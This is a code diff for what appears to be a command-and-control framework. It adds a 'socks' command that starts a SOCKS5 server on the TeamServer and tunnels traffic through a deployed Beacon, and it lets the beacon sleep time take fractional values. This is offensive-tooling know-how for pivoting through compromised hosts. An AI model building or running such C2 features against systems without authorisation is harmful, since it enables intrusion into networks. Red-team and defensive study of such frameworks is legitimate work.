@@ -14,6 +14,7 @@ const std::string ListenerCmd = "listener";
 const std::string ListenerPolCmd = "listenerPol";
 const std::string LoadC2Module = "loadModule";
 const std::string UnloadC2Module = "unloadModule";
+const std::string Socks5 = "socks";
 
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 const std::string ModulesDirectoryFromTeamServer = "../Modules/";
@@ -36,6 +37,7 @@ class CommonCommands
 		m_commonCommands.push_back(ListenerCmd);
 		m_commonCommands.push_back(LoadC2Module);
 		m_commonCommands.push_back(UnloadC2Module);
+		m_commonCommands.push_back(Socks5);
 	}
 
 	int getNumberOfCommand()
@@ -94,6 +96,14 @@ class CommonCommands
 			output += "exemple:\n";
 			output += " - unloadModule assemblyExec \n";
 		}
+		else if(cmd==Socks5)
+		{
+			output = "socks: \n";
+			output += "start socks5 server on the TeamServer and tunnel the traffic to the Beacon.\n";
+			output += "exemple:\n";
+			output += " - socks start 1080 \n";
+			output += " - socks stop 1080 \n";
+		}
 #endif
 		return output;
 	}
@@ -109,10 +119,10 @@ class CommonCommands
 		{
 			if(splitedCmd.size()==2)
 			{
-				int sleepTimeSec=5;
+				float sleepTimeSec=5;
 				try 
 				{
-					sleepTimeSec = atoi(splitedCmd[1].c_str());
+					sleepTimeSec = atof(splitedCmd[1].c_str());
 				}
 				catch (const std::invalid_argument& ia) 
 				{
@@ -260,6 +270,45 @@ class CommonCommands
 				return -1;
 			}
 		}
+		else if(instruction==Socks5)
+		{
+			if(splitedCmd.size()>=3)
+			{
+				if(splitedCmd[1]==StartCmd || splitedCmd[1]==StopCmd)
+				{
+					if(splitedCmd.size()>=3)
+					{
+						int port=-1;
+						try 
+						{
+							port = std::atoi(splitedCmd[2].c_str());
+						}
+						catch (const std::invalid_argument& ia) 
+						{
+							std::cerr << "Invalid argument: " << ia.what() << '\n';
+							return -1;
+						}
+
+						c2Message.set_instruction(instruction);
+						c2Message.set_data(splitedCmd[2].data(), splitedCmd[2].size());	
+						c2Message.set_cmd(splitedCmd[1]);	
+					}
+					else
+					{
+						std::string errorMsg = "socks start/stop: not enough arguments";
+						c2Message.set_returnvalue(errorMsg);	
+						return -1;
+					}
+				}			
+			}
+			else
+			{
+				std::string errorMsg = getHelp(instruction);
+				c2Message.set_returnvalue(errorMsg);
+				return -1;
+			}
+		}
+
 #endif
 		return 0;
 	}
